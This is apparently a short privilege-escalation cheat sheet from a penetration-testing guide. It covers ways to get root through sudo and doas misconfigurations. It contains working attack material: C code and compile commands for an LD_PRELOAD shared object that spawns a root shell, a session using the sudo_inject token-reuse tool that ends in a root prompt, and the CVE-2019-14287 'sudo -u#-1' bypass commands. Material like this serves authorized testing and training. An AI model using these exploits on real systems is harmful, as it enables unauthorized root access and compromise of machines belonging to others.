# LD\_PRELOAD and NOPASSWD

If `LD_PRELOAD` is explicitly defined in the sudoers file

```text
Defaults        env_keep += LD_PRELOAD
```

Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```text
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Execute any binary with the LD\_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`

#### 

#### Doas

There are some alternatives to the `sudo` binary such as `doas` for OpenBSD, remember to check its configuration at `/etc/doas.conf`

```text
permit nopass demo as root cmd vim
```

#### 

#### sudo\_inject

Using [https://github.com/nongiach/sudo\_inject](https://github.com/nongiach/sudo_inject)

```text
$ sudo whatever
[sudo] password for user:    
# Press <ctrl>+c since you don't have the password. 
# This creates an invalid sudo tokens.
$ sh exploit.sh
.... wait 1 seconds
$ sudo -i # no password required :)
# id
uid=0(root) gid=0(root) groups=0(root)
```

Slides of the presentation : [https://github.com/nongiach/sudo\_inject/blob/master/slides\_breizh\_2019.pdf](https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf)

#### 

#### CVE-2019-14287

```text
# Exploitable when a user have the following permissions (sudo -l)
(ALL, !root) ALL

# If you have a full TTY, you can exploit it like this
sudo -u#-1 /bin/bash
sudo -u#4294967295 id
```

